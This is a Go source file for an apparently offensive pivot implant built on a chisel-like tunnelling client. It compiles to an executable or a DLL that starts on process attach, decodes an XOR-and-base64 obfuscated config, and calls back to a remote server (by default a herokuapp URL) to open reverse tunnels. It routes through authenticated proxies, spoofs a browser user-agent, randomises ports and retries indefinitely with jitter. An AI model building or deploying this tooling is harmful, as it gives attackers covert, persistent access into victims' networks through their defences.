package main
import "C"

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/aus/proxyplease"
	"io/ioutil"
	"log"
	"math/rand"
	"unsafe"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"time"

	chclient "github.com/codaul/volume/client"
	_ "github.com/aus/proxyplease"
	"github.com/spf13/viper"
)

var d = net.Dialer{}
var dialContext = d.DialContext
// a make step will encode config.toml file to a string and embed as build variable
var pivotConfig string

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
}

//export OnProcessAttach
func OnProcessAttach(
	hinstDLL unsafe.Pointer, // handle to DLL module
	fdwReason uint32, // reason for calling function
	lpReserved unsafe.Pointer, // reserved
) {
	Pivot(pivotConfig)
}

//export Test
func Test() {
	Pivot(pivotConfig)
}

func main() {
	// TODO: clean this up
	switch len(os.Args) {
	case 2:
		// run encoded config from command line args
		Pivot(os.Args[1])
	case 3:
		// if args "encode filename.toml", then print encoded config and exit
		fmt.Println(encode(os.Args[2]))
		os.Exit(0)
	default:
		Pivot(pivotConfig)
	}
}

func Hello(msg string){
	fmt.Println(msg)
}

// Pivot is the entry point for fhizel-pivot. It takes an encoded config as a parameter.
func Pivot(config string) {
	// prepare config defaults
	setDefaults()

	// read in config
	viper.SetConfigType("yaml")
	err := viper.ReadConfig(bytes.NewBuffer([]byte(decode(config))))
	if err != nil {
		panic(fmt.Errorf("Fatal error config file: %s", err))
	}

	// proxy setup
	// proxyplease module expects some parameters to be nil if unconfigured
	// so convert any empty proxy parameters to nil just in case
	proxyurl, err := url.Parse(viper.GetString("server.proxy.url"))
	if err != nil {
		panic(fmt.Errorf("Error parsing proxy url: %s", err))
	}
	if proxyurl.String() == "" {
		proxyurl = nil
	}

	proxytargeturl, _ := url.Parse(viper.GetString("server.proxy.targeturl"))
	if err != nil {
		panic(fmt.Errorf("Error parsing proxy target url: %s", err))
	}
	if proxytargeturl.String() == "" {
		proxytargeturl = nil
	}

	proxyauthschemes := viper.GetStringSlice("server.proxy.authschemes")
	if len(proxyauthschemes) == 1 {
		if proxyauthschemes[0] == "" {
			proxyauthschemes = nil
		}
	}

	proxyuser := viper.GetString("server.proxy.username")
	proxypass := viper.GetString("server.proxy.password")
	proxydomain := viper.GetString("server.proxy.domain")

	proxyhdrs := parseHeaders(viper.GetStringMapString("server.proxy.headers"))

	// build proxy dialContext
	pp := proxyplease.Proxy{
		URL:              proxyurl,
		Username:         proxyuser,
		Password:         proxypass,
		Domain:           proxydomain,
		AuthSchemeFilter: proxyauthschemes,
		TargetURL:        proxytargeturl,
		Headers:          &proxyhdrs,
	}
	_ = pp


	if viper.GetString("server.proxy.url") == "direct" {
		fmt.Println("Forcing direct connection")
	} else {
		dialContext = proxyplease.NewDialContext(pp)
	}


	// prepare fhizel client config
	urls := viper.GetStringSlice("server.urls")
	remotes := parseRemotes(viper.GetStringSlice("server.remotes"))
	hdrs := parseHeaders(viper.GetStringMapString("server.headers"))
	ka, err := time.ParseDuration(viper.GetString("server.keepalive"))
	if err != nil {
		panic(fmt.Errorf("Error parsing server.keepalive duration: %s", err))
	}
	sleep, err := time.ParseDuration(viper.GetString("server.sleep"))
	if err != nil {
		panic(fmt.Errorf("Error parsing server.sleep duration: %s", err))
	}
	mri, err := time.ParseDuration(viper.GetString("server.maxretryinterval"))
	if err != nil {
		panic(fmt.Errorf("Error parsing server.maxretryinterval duration: %s", err))
	}
	mrc := viper.GetInt("server.maxretrycount")
	fingerprint := viper.GetString("server.fingerprint")
	auth := viper.GetString("server.auth")
	jitter := viper.GetInt("server.jitter")
	giveupafter := viper.GetInt("server.giveupafter")

	attempt := 0
	giveup := false

	// connect loop
	for giveup == false {
		// shuffle urls if requested
		if viper.GetBool("server.shuffle") && len(urls) > 1 {
			rand.Shuffle(len(urls), func(i, j int) { urls[i], urls[j] = urls[j], urls[i] })
		}

		// attempt each url
		for _, url := range urls {
			attempt++
			// shuffle ports again if randomized
			remotes = parseRemotes(viper.GetStringSlice("server.remotes"))
			c, err := chclient.NewClient(&chclient.Config{
				Fingerprint:      fingerprint,
				Auth:             auth,
				KeepAlive:        ka,
				MaxRetryCount:    mrc,
				MaxRetryInterval: mri,
				Server:           url,
				Remotes:          remotes,
				Headers:          hdrs,
				DialContext:      dialContext,
			})
			if err != nil {
				log.Fatal(err)
			}

			c.Debug = true
			err = c.Run() // blocks until disconnect
			if err != nil {
				log.Println(err)
			}

			// give up?
			if attempt >= giveupafter && giveupafter > 0 {
				log.Println("client: Max attempts reached. Giving up!")
				giveup = true
				break
			}

			// now sleep between attempts
			snooze(sleep, jitter)

			// TODO: if expired, return
		}
	}
}

func snooze(sleep time.Duration, jitter int) {
	if jitter > 0 {
		sleepF64 := float64(sleep)
		jitterF64 := float64(jitter) / 100
		min := sleepF64 - (sleepF64 * jitterF64)
		max := sleepF64 + (sleepF64 * jitterF64)
		t := rand.Int63n(int64(max)) + int64(min)
		sleep = time.Duration(t)
	}

	log.Printf("client: Sleeping %s...", sleep.Round(time.Second).String())
	time.Sleep(sleep)
}

func decode(s string) string {
	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		fmt.Printf("Error decoding string: %s ", err.Error())
		return ""
	}

	var output string
	// so l33t
	k := "fhizel"
	for i := 0; i < len(decoded); i++ {
		output += string(decoded[i] ^ k[i%len(k)])
	}
	return output
}

func encode(filename string) string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	b, err := ioutil.ReadAll(file)
	// XOR
	k := "fhizel"
	for i := 0; i < len(b); i++ {
		b[i] = b[i] ^ k[i%len(k)]
	}
	// b64 encode
	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(b)))
	base64.StdEncoding.Encode(encoded, b)
	return string(encoded)
}

func parseHeaders(s map[string]string) http.Header {
	// for each key, value insert into http.Header type
	hdrs := make(http.Header)
	for k, v := range s {
		hdrs.Set(k, v)
	}
	return hdrs
}

func parseRemotes(remotes []string) []string {
	// convert '#' to random digit. useful for avoiding port conflicts.
	for i, remote := range remotes {
		remote := []byte(remote)
		for i := 0; i < len(remote); i++ {
			if remote[i] == '#' {
				rstr := strconv.Itoa(rand.Intn(9))
				remote[i] = rstr[0]
			}
		}
		remotes[i] = string(remote)
	}
	return remotes
}

func setDefaults() {
	viper.SetDefault("server.urls", []string{"https://fhizel-demo.herokuapp.com"})
	viper.SetDefault("server.remotes", []string{"3###"})
	viper.SetDefault("server.headers.User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0")
	viper.SetDefault("server.proxy.headers.User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0")
	viper.SetDefault("server.keepalive", "5s")
	viper.SetDefault("server.shuffle", true)
	viper.SetDefault("server.maxretrycount", 0)
	viper.SetDefault("server.maxretryinterval", "10s")
	viper.SetDefault("server.giveupafter", 0)
	viper.SetDefault("server.sleep", "10s")
	viper.SetDefault("server.jitter", 0)

	// TODO: expire default variable
	// TODO: multiple [server] support
}
